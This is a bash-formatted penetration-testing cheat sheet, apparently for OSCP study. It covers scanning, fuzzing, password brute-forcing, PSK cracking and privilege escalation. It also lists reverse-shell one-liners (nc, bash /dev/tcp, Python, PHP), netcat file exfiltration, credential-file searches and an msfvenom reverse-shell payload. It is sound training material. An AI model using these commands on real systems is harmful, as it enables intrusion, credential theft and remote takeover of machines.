#!/usr/bin/env bash
########################################
# 0. BASIC ENUMERATION
########################################

# Quick network discovery (Ethernet only)
netdiscover -i eth0 -r 10.0.0.1/24

# If netdiscover doesn't work (VPN/tunnel), fall back to ping sweep
ifconfig
route
nmap 10.0.0.1/24 -sn -T5 -v

########################################
# Install Rustscan (manual)
########################################
# Download .deb from releases → https://github.com/RustScan/RustScan/releases
# Then install:
dpkg -i rustscan*.deb

########################################
# 1. PORT SCANNING
########################################

# Full TCP scan (OSCP-friendly)
nmap $target -sS -T4 -A -p- -v

# Fast aggressive scan
nmap $target -Pn -p- --min-rate 2000 -sC -sV -v

# UDP quick top ports
nmap $target -Pn -sU -sV -T3 --top-ports 25 -v

# Rustscan (fast)
rustscan -a $target --ulimit 5000

# Scan specific ports
nmap $target -p 22,80 -sC -sV -v

# After scanning → search for known vulns
searchsploit <service/version>

########################################
# 2. VPN / IKE / IPsec Checks
########################################

# Install ike-scan if needed
sudo apt install ike-scan -y

# Identify IKE / IPsec info
sudo ike-scan -M -A $target

# Enumerate and crack PSK
sudo ike-scan -A --pskcrack $target
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

# If credentials found
ssh <user>@$target

# Ensure rockyou is extracted
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

########################################
# 3. WEB ENUMERATION
########################################

# Add virtual hosts manually
sudo vim /etc/hosts

# Basic vulnerability scan
nikto -host $target

# Quick SSTI test (Node/Python templates)
# Try in inputs:
# {{7*7}}

##########
# Dir/VHost Fuzzing
##########
dirsearch -u http://example.lab
gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://example.lab/FUZZ
gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

##########
# Manual Web Checks (Burp)
##########
# - Look for JS files, hidden params
# - Check cookies/session tokens
# - Intercept → Modify → Replay requests

########################################
# 4. CREDENTIAL ATTACKS (LAB ONLY)
########################################

hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
<TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"

########################################
# 5. REVERSE SHELLS & LISTENERS
########################################

# Listener
nc -nvlp 5555

# Common one-liners:
# nc (if -e supported)
# nc -e /bin/sh <LHOST> <LPORT>

# Bash
# bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Python
# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PHP
# php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Spawn stable PTY
python -c 'import pty; pty.spawn("/bin/bash")'

########################################
# 6. FILE TRANSFER
########################################

# Receive file on attacker
# nc -nvlp <PORT> > file

# Send from target
# nc <LHOST> <PORT> < file

########################################
# 7. INITIAL POST-EXPLOIT ENUM
########################################

whoami
id
hostname
uname -a
pwd
ls -la
ps aux
sudo -l

########################################
# 8. PRIVILEGE ESCALATION (IMPORTANT for OSCP)
########################################

##########
# LINUX QUICK ENUM
##########
# Automated
linpeas.sh
linux-smart-enumeration.sh -l 1
sudo -l

# Manual checks
cat /etc/passwd
grep -i 'password' -R /etc /home 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
crontab -l
ls -la /tmp
env

##########
# WORDPRESS QUICK CHECK
##########
wpscan --url http://example.lab --enumerate u,p

##########
# SUDO Priv Esc
##########
# Check GTFOBins
# https://gtfobins.github.io

##########
# Kernel exploits (careful on exam)
##########
uname -r
searchsploit linux kernel | grep <version>

########################################
# 9. WINDOWS PRIV ESC
########################################

# WinPEAS
winpeas.exe

# Enumeration
systeminfo
whoami /priv
ipconfig /all
wmic qfe
dir /a c:\Users
net user
net localgroup administrators

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"

# DLL Hijacking locations
echo %PATH%

########################################
# 10. PIVOTING & TUNNELING (OSCP MUST KNOW)
########################################

# SSH Local Port Forward
ssh -L 8080:localhost:80 user@$target

# SSH Remote Port Forward
ssh -R 4444:localhost:22 user@$target

# Dynamic SOCKS proxy
ssh -D 9050 user@$target

# Proxychains (edit /etc/proxychains.conf)
proxychains nmap -sT -Pn 127.0.0.1

# Chisel
# Server (attacker):
chisel server -p 9001 --reverse
# Client (victim):
chisel client <LHOST>:9001 R:8000:localhost:80

########################################
# 11. BUFFER OVERFLOW MINI-CHECKLIST (OSCP)
########################################

# Fuzz with Python
# python bof-fuzz.py

# Steps:
# 1. Fuzz input
# 2. Find offset (pattern_create / pattern_offset)
# 3. Confirm EIP control
# 4. Bad chars test
# 5. Find JMP ESP
# 6. Build shellcode (msfvenom)
# 7. Exploit

# Example msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c

########################################
# END
########################################
